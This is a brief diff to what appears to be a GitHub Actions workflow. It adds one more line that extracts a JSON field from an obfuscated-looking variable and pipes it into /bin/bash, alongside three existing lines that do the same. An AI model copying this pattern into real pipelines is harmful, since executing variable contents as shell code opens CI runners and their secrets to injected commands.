@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$xurup7954" | jq -r .nvc755 | /bin/bash
           printf '%s' "$tn57" | jq -r .ezga401 | /bin/bash
           printf '%s' "$wvj9246" | jq -r .pcdgu78 | /bin/bash
+          echo $nsq8 | jq -r .fw37 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
